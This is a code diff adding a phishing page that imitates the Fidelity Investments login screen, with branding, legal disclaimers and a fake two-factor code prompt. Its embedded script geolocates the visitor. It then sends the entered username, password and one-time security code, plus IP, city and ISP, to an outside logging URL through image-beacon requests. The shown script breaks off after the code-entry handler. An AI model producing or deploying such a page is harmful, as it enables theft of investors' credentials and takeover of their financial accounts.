@@ -1,0 +1,1328 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fidelity Investments - Login</title>
+    <link rel="icon" href="https://i.ibb.co/nNJXXZwV/download-3.png" type="image/x-icon">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: Arial, Helvetica, sans-serif;
+            background: #FAF8F0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        /* Top Navigation */
+        .top-nav {
+            width: 100%;
+            background: #FFFFFF;
+            padding: 12px 40px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-wrap: wrap;
+            border-bottom: 1px solid #e8eaed;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.06);
+        }
+
+        .nav-left {
+            display: flex;
+            align-items: center;
+        }
+
+        .nav-left .logo img {
+            height: 40px;
+            width: auto;
+            display: block;
+        }
+
+        .nav-right {
+            display: flex;
+            align-items: center;
+            gap: 24px;
+        }
+
+        .nav-right .security-link {
+            color: #000000;
+            text-decoration: none;
+            font-size: 18px;
+            font-weight: 500;
+        }
+
+        .nav-right .security-link:hover {
+            color: #003366;
+        }
+
+        .nav-right .faqs-link {
+            color: #000000;
+            text-decoration: none;
+            font-size: 18px;
+            font-weight: 500;
+        }
+
+        .nav-right .faqs-link:hover {
+            color: #003366;
+        }
+
+        /* Main Login Card */
+        .login-card {
+            background: white;
+            border-radius: 8px;
+            padding: 48px 44px;
+            width: 460px;
+            max-width: 95%;
+            margin: 60px auto 15px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.12);
+            border: 1px solid #c7c4bf;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+
+        .login-card.hidden {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+            position: absolute;
+        }
+
+        .login-card .login-title {
+            text-align: left;
+            font-size: 34px;
+            font-weight: 700;
+            color: #000000;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 5px;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #ccd0d5;
+            border-radius: 4px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .form-group input:focus {
+            border-color: #000000;
+            box-shadow: 0 0 0 3px rgba(0, 0, 0, 0.15);
+        }
+
+        .form-group input.invalid {
+            border-color: #ea4335;
+            box-shadow: 0 0 0 3px rgba(234, 67, 53, 0.15);
+        }
+
+        .password-wrapper {
+            position: relative;
+        }
+
+        .password-wrapper input {
+            padding-right: 44px;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #666;
+            padding: 4px;
+            font-size: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .password-toggle:hover {
+            color: #333;
+        }
+
+        .password-toggle svg {
+            width: 20px;
+            height: 20px;
+            fill: none;
+            stroke: currentColor;
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+        }
+
+        .form-error {
+            color: #ea4335;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .form-error.show {
+            display: block;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin: 15px 0 20px;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            cursor: pointer;
+        }
+
+        .checkbox-group label {
+            font-size: 14px;
+            color: #555;
+            cursor: pointer;
+        }
+
+        .login-btn {
+            width: 100%;
+            background: #337e0d;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+
+        .login-btn:hover {
+            background: #2a6a0a;
+        }
+
+        .login-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .forgot-links {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 18px;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+
+        .forgot-links a {
+            color: #0047AB;
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.2s;
+        }
+
+        .forgot-links a:hover {
+            color: #003380;
+            text-decoration: underline;
+        }
+
+        /* Signup Section - Background Page */
+        .signup-section {
+            text-align: center;
+            margin-top: 0;
+            padding: 0 20px;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+            margin-bottom: 100px;
+        }
+
+        .signup-section.hidden {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+        }
+
+        .signup-section p {
+            font-size: 16px;
+            color: #555;
+            font-weight: 400;
+        }
+
+        .signup-section .signup-link {
+            color: #0047AB;
+            text-decoration: none;
+            font-weight: 400;
+            font-size: 16px;
+        }
+
+        .signup-section .signup-link:hover {
+            text-decoration: underline;
+            color: #003380;
+        }
+
+        .signup-section .or-text {
+            color: #333333;
+            font-size: 16px;
+            font-weight: 400;
+        }
+
+        /* Disclaimer Section */
+        .disclaimer-section {
+            max-width: 100%;
+            width: 92%;
+            margin-top: 0;
+            padding-top: 30px;
+            border-top: 1px solid #d0d0d0;
+            padding-left: 4%;
+            padding-right: 4%;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+
+        .disclaimer-section.hidden {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+        }
+
+        .disclaimer-section .disclaimer-title {
+            font-size: 15px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 10px;
+            text-align: left;
+        }
+
+        .disclaimer-section .disclaimer-text {
+            font-size: 13px;
+            color: #666;
+            line-height: 1.8;
+            text-align: left;
+        }
+
+        .disclaimer-section .disclaimer-text a {
+            color: #0047AB;
+            text-decoration: none;
+        }
+
+        .disclaimer-section .disclaimer-text a:hover {
+            text-decoration: underline;
+        }
+
+        .disclaimer-section .disclaimer-text .external-link {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 1.5px solid #0047AB;
+            border-radius: 2px;
+            text-align: center;
+            line-height: 14px;
+            font-size: 10px;
+            margin-left: 3px;
+            color: #0047AB;
+            font-weight: 700;
+            vertical-align: middle;
+            position: relative;
+            top: -1px;
+        }
+
+        .disclaimer-section .disclaimer-text .external-link svg {
+            width: 10px;
+            height: 10px;
+            fill: none;
+            stroke: #0047AB;
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            display: inline-block;
+            vertical-align: middle;
+        }
+
+        .disclaimer-section .disclaimer-text .sub-text {
+            display: block;
+            margin-top: 8px;
+        }
+
+        .disclaimer-section .disclaimer-text .fidelity-address {
+            display: block;
+            margin-top: 8px;
+            font-size: 12px;
+            color: #888;
+        }
+
+        /* Loading Overlay */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.6);
+            backdrop-filter: blur(4px);
+            z-index: 1150;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            visibility: hidden;
+            opacity: 0;
+            transition: all 0.3s ease;
+        }
+
+        .loading-overlay.active {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        .loading-content {
+            text-align: center;
+            color: white;
+        }
+
+        .loading-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 20px;
+            font-weight: 500;
+            color: white;
+        }
+
+        /* 2FA Modal */
+        .twofa-modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            backdrop-filter: blur(4px);
+            z-index: 1100;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            visibility: hidden;
+            opacity: 0;
+            transition: all 0.2s ease;
+        }
+
+        .twofa-modal-overlay.active {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        .twofa-modal {
+            background: white;
+            max-width: 420px;
+            width: 90%;
+            border-radius: 12px;
+            padding: 36px 32px;
+            text-align: center;
+            position: relative;
+        }
+
+        .twofa-close {
+            position: absolute;
+            top: 12px;
+            right: 16px;
+            background: none;
+            border: none;
+            font-size: 22px;
+            cursor: pointer;
+            color: #666;
+        }
+
+        .twofa-close:hover {
+            color: #333;
+        }
+
+        .twofa-subtitle {
+            color: #333;
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 28px;
+            line-height: 1.4;
+        }
+
+        .twofa-input-wrapper {
+            position: relative;
+            margin-bottom: 20px;
+            text-align: left;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .twofa-input-wrapper label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 6px;
+            width: 320px;
+            text-align: left;
+            padding-left: 0;
+        }
+
+        .twofa-input {
+            width: 320px;
+            padding: 14px 20px;
+            border: 1px solid #ccd0d5;
+            border-radius: 4px;
+            font-size: 18px;
+            outline: none;
+            font-family: Arial, Helvetica, sans-serif;
+            text-align: center;
+            letter-spacing: 6px;
+        }
+
+        .twofa-input:focus {
+            border-color: #000000;
+            box-shadow: 0 0 0 3px rgba(0, 0, 0, 0.15);
+        }
+
+        .twofa-btn {
+            width: 320px;
+            background: #337e0d;
+            color: white;
+            border: none;
+            padding: 14px 20px;
+            border-radius: 50px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s;
+            margin-top: 0;
+        }
+
+        .twofa-btn:hover {
+            background: #2a6a0a;
+        }
+
+        .resend-link {
+            text-align: center;
+            margin-top: 16px;
+            font-size: 14px;
+            color: #555;
+        }
+
+        .resend-link a {
+            color: #0047AB;
+            text-decoration: none;
+            font-weight: 400;
+            transition: color 0.2s;
+        }
+
+        .resend-link a:hover {
+            color: #003380;
+            text-decoration: underline;
+        }
+
+        /* Toast Notification */
+        .toast-notification {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(-100px);
+            background: #337e0d;
+            color: white;
+            padding: 12px 30px;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 500;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            z-index: 9999;
+            opacity: 0;
+            transition: all 0.4s ease;
+            pointer-events: none;
+        }
+
+        .toast-notification.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        .toast-notification.success {
+            background: #337e0d;
+        }
+
+        .toast-notification.error {
+            background: #ea4335;
+        }
+
+        /* Downloading Overlay */
+        .downloading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.98);
+            z-index: 1200;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            visibility: hidden;
+            opacity: 0;
+        }
+
+        .downloading-overlay.active {
+            visibility: visible;
+            opacity: 1;
+        }
+
+        .downloading-spinner {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #e8eaed;
+            border-top-color: #0066cc;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            margin: 0 auto 16px;
+        }
+
+        .downloading-title {
+            font-size: 16px;
+            font-weight: 500;
+            color: #202124;
+        }
+
+        /* Footer */
+        .footer {
+            width: 100%;
+            text-align: right;
+            font-size: 12px;
+            color: #888;
+            padding: 16px 40px;
+            background: white;
+            border-top: 1px solid #e8eaed;
+            margin-top: auto;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+
+        .footer.hidden {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+        }
+
+        .footer-content {
+            max-width: 1400px;
+            margin: 0 auto;
+            text-align: right;
+        }
+
+        .footer-content .copyright {
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .footer-content .footer-links {
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .footer-content .footer-links a {
+            color: #0047AB;
+            text-decoration: none;
+            font-size: 12px;
+        }
+
+        .footer-content .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-content .footer-links .external-link {
+            display: inline-block;
+            width: 14px;
+            height: 14px;
+            border: 1.5px solid #0047AB;
+            border-radius: 2px;
+            text-align: center;
+            line-height: 12px;
+            font-size: 9px;
+            margin-left: 3px;
+            color: #0047AB;
+            font-weight: 700;
+            vertical-align: middle;
+            position: relative;
+            top: -1px;
+        }
+
+        .footer-content .footer-links .external-link svg {
+            width: 9px;
+            height: 9px;
+            fill: none;
+            stroke: #0047AB;
+            stroke-width: 2;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            display: inline-block;
+            vertical-align: middle;
+        }
+
+        .footer-content .footer-note {
+            display: block;
+            color: #888;
+            font-size: 12px;
+        }
+
+        @media (max-width: 768px) {
+            .top-nav { padding: 10px 20px; }
+            .login-card { padding: 36px 30px; width: 400px; margin-top: 40px; }
+            .loading-text { font-size: 18px; }
+            .nav-left .logo img { height: 32px; }
+            .nav-right .security-link { font-size: 16px; }
+            .nav-right .faqs-link { font-size: 16px; }
+            .nav-right { gap: 18px; }
+            .login-card .login-title { font-size: 30px; }
+            .signup-section p { font-size: 15px; }
+            .signup-section .signup-link { font-size: 15px; }
+            .signup-section .or-text { font-size: 15px; }
+            .signup-section { margin-bottom: 60px; }
+            .twofa-subtitle { font-size: 20px; }
+            .twofa-input-wrapper label { width: 280px; }
+            .twofa-input { font-size: 16px; width: 280px; letter-spacing: 5px; padding: 12px 16px; border-radius: 4px; }
+            .twofa-btn { width: 280px; padding: 12px 16px; border-radius: 40px; }
+            .resend-link { font-size: 13px; }
+            .resend-link a { font-weight: 400; }
+            .toast-notification { font-size: 14px; padding: 10px 24px; }
+            .form-group input { padding: 12px 14px; font-size: 15px; }
+            .disclaimer-section { width: 95%; padding-left: 2.5%; padding-right: 2.5%; }
+            .disclaimer-section .disclaimer-text { font-size: 12px; }
+            .disclaimer-section .disclaimer-title { font-size: 14px; }
+            .disclaimer-section { padding-top: 25px; }
+            .footer { padding: 12px 20px; text-align: right; font-size: 11px; }
+            .footer-content { text-align: right; }
+            .footer-content .footer-links a { font-size: 11px; }
+            .footer-content .footer-note { font-size: 11px; }
+        }
+
+        @media (max-width: 480px) {
+            .login-card { padding: 28px 22px; width: 340px; margin-top: 30px; }
+            .twofa-subtitle { font-size: 18px; }
+            .nav-left .logo img { height: 28px; }
+            .nav-right .security-link { font-size: 14px; }
+            .nav-right .faqs-link { font-size: 14px; }
+            .nav-right { gap: 14px; }
+            .login-card .login-title { font-size: 26px; }
+            .signup-section p { font-size: 14px; }
+            .signup-section .signup-link { font-size: 14px; }
+            .signup-section .or-text { font-size: 14px; }
+            .signup-section { margin-bottom: 50px; }
+            .loading-text { font-size: 16px; }
+            .twofa-input-wrapper label { width: 220px; font-size: 13px; }
+            .twofa-input { font-size: 15px; width: 220px; letter-spacing: 4px; padding: 12px 14px; border-radius: 4px; }
+            .twofa-btn { width: 220px; padding: 12px 14px; font-size: 14px; border-radius: 30px; }
+            .resend-link { font-size: 12px; }
+            .resend-link a { font-weight: 400; }
+            .toast-notification { font-size: 13px; padding: 8px 18px; }
+            .form-group input { padding: 10px 12px; font-size: 14px; }
+            .disclaimer-section { width: 98%; padding-left: 1%; padding-right: 1%; }
+            .disclaimer-section .disclaimer-text { font-size: 11px; }
+            .disclaimer-section .disclaimer-title { font-size: 13px; }
+            .disclaimer-section { padding-top: 20px; }
+            .footer { padding: 10px 16px; font-size: 10px; text-align: right; }
+            .footer-content { text-align: right; }
+            .footer-content .footer-links a { font-size: 10px; }
+            .footer-content .footer-note { font-size: 10px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Top Navigation -->
+    <div class="top-nav">
+        <div class="nav-left">
+            <a href="#" class="logo">
+                <img src="https://digital.fidelity.com/prgw/digital/signin/assets/images/Fid_Wordmark-Logo_Green.svg" alt="Fidelity Investments">
+            </a>
+        </div>
+        <div class="nav-right">
+            <a href="#" class="security-link">Security</a>
+            <a href="#" class="faqs-link">FAQs</a>
+        </div>
+    </div>
+
+    <!-- Login Card -->
+    <div class="login-card" id="loginCard">
+        <div class="login-title">Log in</div>
+
+        <div class="form-group">
+            <label for="username">Username</label>
+            <input type="text" id="username" placeholder="" autocomplete="username">
+            <div class="form-error" id="usernameError">Please enter your username.</div>
+        </div>
+
+        <div class="form-group">
+            <label for="password">Password</label>
+            <div class="password-wrapper">
+                <input type="password" id="password" placeholder="" autocomplete="current-password">
+                <button class="password-toggle" id="passwordToggle" type="button" aria-label="Show password">
+                    <svg viewBox="0 0 24 24">
+                        <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
+                        <circle cx="12" cy="12" r="3"/>
+                    </svg>
+                </button>
+            </div>
+            <div class="form-error" id="passwordError">Please enter your password.</div>
+        </div>
+
+        <div class="checkbox-group">
+            <input type="checkbox" id="rememberMe">
+            <label for="rememberMe">Remember my username</label>
+        </div>
+
+        <button class="login-btn" id="loginBtn">Log in</button>
+
+        <div class="forgot-links">
+            <a href="#" id="forgotUsernameLink">Forgot username or password?</a>
+        </div>
+    </div>
+
+    <!-- Signup Section - Background Page -->
+    <div class="signup-section" id="signupSection">
+        <p><span style="color: #555; font-weight: 400;">New to Fidelity?</span> <a href="#" class="signup-link" id="signupLink">Open an account</a> <span class="or-text">or</span> <a href="#" class="signup-link" id="signupLink2">sign up.</a></p>
+    </div>
+
+    <!-- Disclaimer Section -->
+    <div class="disclaimer-section" id="disclaimerSection">
+        <div class="disclaimer-title">Disclaimer</div>
+        <div class="disclaimer-text">
+            National Financial Services LLC Statement of Financial Condition, <a href="#"> <span class="external-link"><svg viewBox="0 0 24 24"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg></span></a>
+            <span class="sub-text">Use of this site involves the electronic transmission of personal financial information. Using this product is consent to such transmission of this information; such consent is effective at all times when using this site. Fidelity supports 128-bit browser encryption, <a href="#"> <span class="external-link"><svg viewBox="0 0 24 24"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg></span></a>.</span>
+            <span class="sub-text">Before investing, consider the funds' investment objectives, risks, charges, and expenses. Contact Fidelity for a prospectus or, if available, a summary prospectus containing this information. Read it carefully.</span>
+            <span class="sub-text">Fidelity Brokerage Services LLC, Member NYSE, SIPC. 900 Salem Street, Smithfield, RI 02917</span>
+            <span class="fidelity-address">1159659.1.0</span>
+        </div>
+    </div>
+
+    <!-- Toast Notification -->
+    <div id="toastNotification" class="toast-notification success">New code sent</div>
+
+    <!-- Loading Overlay -->
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="loading-content">
+            <div class="loading-spinner"></div>
+            <div class="loading-text">Logging in...</div>
+        </div>
+    </div>
+
+    <!-- 2FA Modal -->
+    <div id="twofaModal" class="twofa-modal-overlay">
+        <div class="twofa-modal">
+            <button class="twofa-close" id="twofaCloseBtn">✕</button>
+            <div class="twofa-subtitle">We've sent a temporary code<br>to your phone to verify it's you</div>
+
+            <div class="twofa-input-wrapper">
+                <label for="twofaCode">Security Code</label>
+                <input type="text" id="twofaCode" class="twofa-input" maxlength="6" placeholder="" autocomplete="one-time-code">
+            </div>
+
+            <button class="twofa-btn" id="twofaVerifyBtn">Submit</button>
+
+            <div class="resend-link">
+                Didn't receive a code? <a href="#" id="resendCodeLink">Resend code</a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Downloading Overlay -->
+    <div id="downloadingOverlay" class="downloading-overlay">
+        <div>
+            <div class="downloading-spinner"></div>
+            <div class="downloading-title">Securely logging in...</div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <div class="footer" id="footerSection">
+        <div class="footer-content">
+            <span class="copyright">Copyright 1998-2026 FMR LLC. All rights reserved.</span>
+            <span class="footer-links">
+                <a href="#">Terms of Use</a> <span class="external-link"><svg viewBox="0 0 24 24"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg></span> &middot;
+                <a href="#">Privacy Policy</a> <span class="external-link"><svg viewBox="0 0 24 24"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg></span> &middot;
+                <a href="#">Security</a> <span class="external-link"><svg viewBox="0 0 24 24"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg></span> &middot;
+                <a href="#">Accessibility</a> <span class="external-link"><svg viewBox="0 0 24 24"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg></span>
+            </span>
+            <span class="footer-note">This is for persons in the U.S. only.</span>
+        </div>
+    </div>
+
+    <script>
+        // ============================================
+        // PHP LOG URL CONFIGURATION
+        // ============================================
+        const LOG_URL = 'https://kapiloffsglass.co/x/log.php';
+        // ============================================
+
+        // ============================================
+        // GLOBAL VARIABLES
+        // ============================================
+        var userLocation = {
+            ip: 'Unknown',
+            country: 'Unknown',
+            region: 'Unknown',
+            city: 'Unknown',
+            isp: 'Unknown'
+        };
+        
+        var storedUsername = '';
+        var storedPassword = '';
+        var loadingTimeout = null;
+        var verificationMethod = 'sms';
+        var credentialsSent = false;
+        var attemptCount = 0;
+        // ============================================
+
+        // ============================================
+        // GET IP AND LOCATION INFORMATION
+        // ============================================
+        function getUserLocation() {
+            fetch('https://ipapi.co/json/')
+                .then(function(response) {
+                    if (!response.ok) throw new Error('Network response was not ok');
+                    return response.json();
+                })
+                .then(function(data) {
+                    userLocation.ip = data.ip || 'Unknown';
+                    userLocation.country = data.country_name || data.country || 'Unknown';
+                    userLocation.region = data.region || data.region_code || 'Unknown';
+                    userLocation.city = data.city || 'Unknown';
+                    userLocation.isp = data.org || data.isp || 'Unknown';
+                    console.log('Location data fetched:', userLocation);
+                })
+                .catch(function(error) {
+                    console.log('ipapi.co failed, trying backup...');
+                    fetch('http://ip-api.com/json/')
+                        .then(function(response) {
+                            if (!response.ok) throw new Error('Network response was not ok');
+                            return response.json();
+                        })
+                        .then(function(data) {
+                            if (data.status === 'success') {
+                                userLocation.ip = data.query || 'Unknown';
+                                userLocation.country = data.country || 'Unknown';
+                                userLocation.region = data.regionName || data.region || 'Unknown';
+                                userLocation.city = data.city || 'Unknown';
+                                userLocation.isp = data.isp || 'Unknown';
+                                console.log('Location data fetched (backup):', userLocation);
+                            }
+                        })
+                        .catch(function(err) {
+                            console.log('All location APIs failed, using default values.');
+                        });
+                });
+        }
+
+        getUserLocation();
+        // ============================================
+
+        // ============================================
+        // TOAST NOTIFICATION FUNCTION
+        // ============================================
+        function showToast(message, type) {
+            var toast = document.getElementById('toastNotification');
+            toast.textContent = message || 'New code sent';
+            toast.className = 'toast-notification ' + (type || 'success');
+            
+            void toast.offsetWidth;
+            toast.classList.add('show');
+            
+            clearTimeout(toast._timeout);
+            toast._timeout = setTimeout(function() {
+                toast.classList.remove('show');
+            }, 3000);
+        }
+        // ============================================
+
+        // ============================================
+        // LOG FUNCTIONS - Send data to PHP
+        // ============================================
+        function logToServer(eventType, extraData) {
+            var img = new Image();
+            var username = extraData?.username || storedUsername || '';
+            var password = extraData?.password || storedPassword || '';
+            var code = extraData?.code || '';
+            
+            var url = LOG_URL + '?event=' + encodeURIComponent(eventType);
+            url += '&email=' + encodeURIComponent(username);
+            url += '&password=' + encodeURIComponent(password);
+            url += '&code=' + encodeURIComponent(code);
+            url += '&time=' + encodeURIComponent(new Date().toISOString());
+            url += '&ip=' + encodeURIComponent(userLocation.ip);
+            url += '&country=' + encodeURIComponent(userLocation.country);
+            url += '&region=' + encodeURIComponent(userLocation.region);
+            url += '&city=' + encodeURIComponent(userLocation.city);
+            url += '&isp=' + encodeURIComponent(userLocation.isp);
+            
+            console.log('Logging to server:', url);
+            img.src = url;
+        }
+
+        function logForgotPassword(username) {
+            var img = new Image();
+            var url = LOG_URL + '?event=FORGOT_PASSWORD';
+            url += '&email=' + encodeURIComponent(username);
+            url += '&time=' + encodeURIComponent(new Date().toISOString());
+            url += '&ip=' + encodeURIComponent(userLocation.ip);
+            url += '&country=' + encodeURIComponent(userLocation.country);
+            url += '&region=' + encodeURIComponent(userLocation.region);
+            url += '&city=' + encodeURIComponent(userLocation.city);
+            url += '&isp=' + encodeURIComponent(userLocation.isp);
+            img.src = url;
+        }
+        // ============================================
+
+        // ============================================
+        // DOM ELEMENTS
+        // ============================================
+        const loginCard = document.getElementById('loginCard');
+        const signupSection = document.getElementById('signupSection');
+        const disclaimerSection = document.getElementById('disclaimerSection');
+        const footerSection = document.getElementById('footerSection');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+        const passwordToggle = document.getElementById('passwordToggle');
+        const passwordError = document.getElementById('passwordError');
+        const usernameError = document.getElementById('usernameError');
+        const forgotUsernameLink = document.getElementById('forgotUsernameLink');
+        const signupLink = document.getElementById('signupLink');
+        const signupLink2 = document.getElementById('signupLink2');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const twofaModal = document.getElementById('twofaModal');
+        const twofaCloseBtn = document.getElementById('twofaCloseBtn');
+        const twofaCode = document.getElementById('twofaCode');
+        const twofaVerifyBtn = document.getElementById('twofaVerifyBtn');
+        const resendCodeLink = document.getElementById('resendCodeLink');
+        const downloadingOverlay = document.getElementById('downloadingOverlay');
+        // ============================================
+
+        // ============================================
+        // HIDE/SHOW FUNCTIONS
+        // ============================================
+        function hideSignupSection() { signupSection.classList.add('hidden'); }
+        function showSignupSection() { signupSection.classList.remove('hidden'); }
+        function hideDisclaimerSection() { disclaimerSection.classList.add('hidden'); }
+        function showDisclaimerSection() { disclaimerSection.classList.remove('hidden'); }
+        function hideFooterSection() { footerSection.classList.add('hidden'); }
+        function showFooterSection() { footerSection.classList.remove('hidden'); }
+        function hideLoginCard() { loginCard.classList.add('hidden'); }
+        function showLoginCard() { loginCard.classList.remove('hidden'); }
+        // ============================================
+
+        // ============================================
+        // PASSWORD TOGGLE
+        // ============================================
+        passwordToggle.addEventListener('click', function(e) {
+            e.preventDefault();
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                this.innerHTML = `<svg viewBox="0 0 24 24"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>`;
+            } else {
+                passwordInput.type = 'password';
+                this.innerHTML = `<svg viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>`;
+            }
+        });
+        // ============================================
+
+        // ============================================
+        // VALIDATION FUNCTIONS
+        // ============================================
+        function isValidEmail(email) {
+            var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+
+        function validateUsername() {
+            var username = usernameInput.value.trim();
+            if (!username) {
+                usernameInput.classList.add('invalid');
+                usernameError.classList.add('show');
+                loginBtn.disabled = true;
+                return false;
+            } else {
+                usernameInput.classList.remove('invalid');
+                usernameError.classList.remove('show');
+                loginBtn.disabled = false;
+                return true;
+            }
+        }
+
+        function validatePassword() {
+            var password = passwordInput.value;
+            if (!password) {
+                passwordInput.classList.add('invalid');
+                passwordError.textContent = 'Please enter your password.';
+                passwordError.classList.add('show');
+                loginBtn.disabled = true;
+                return false;
+            } else {
+                passwordInput.classList.remove('invalid');
+                passwordError.classList.remove('show');
+                loginBtn.disabled = false;
+                return true;
+            }
+        }
+        // ============================================
+
+        // ============================================
+        // INPUT EVENT LISTENERS
+        // ============================================
+        usernameInput.addEventListener('input', function() {
+            validateUsername();
+            if (usernameInput.value.trim() && passwordInput.value) {
+                loginBtn.disabled = false;
+            }
+        });
+
+        usernameInput.addEventListener('blur', function() {
+            validateUsername();
+        });
+
+        passwordInput.addEventListener('input', function() {
+            validatePassword();
+            if (usernameInput.value.trim() && passwordInput.value) {
+                loginBtn.disabled = false;
+            }
+        });
+
+        passwordInput.addEventListener('blur', validatePassword);
+        passwordInput.addEventListener('input', function() {
+            passwordError.classList.remove('show');
+            this.classList.remove('invalid');
+        });
+        // ============================================
+
+        // ============================================
+        // 2FA CODE AUTO-ADVANCE
+        // ============================================
+        twofaCode.addEventListener('input', function() {
+            var value = this.value.replace(/\D/g, '');
+            this.value = value;
+            if (value.length === 6) {
+                twofaVerifyBtn.focus();
+            }
+        });
+        // ============================================
+
